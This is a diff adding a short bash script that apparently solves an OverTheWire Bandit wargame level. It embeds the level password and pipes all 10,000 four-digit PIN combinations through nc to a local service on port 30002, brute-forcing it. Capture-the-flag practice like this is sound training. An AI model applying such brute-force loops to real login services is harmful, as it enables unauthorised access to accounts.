@@ -1,0 +1,8 @@
+#!/bin/bash
+
+bandit24=gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+for pin in {0000..9999}; do
+
+        echo  "$bandit24 $pin"
+done | nc  localhost  30002
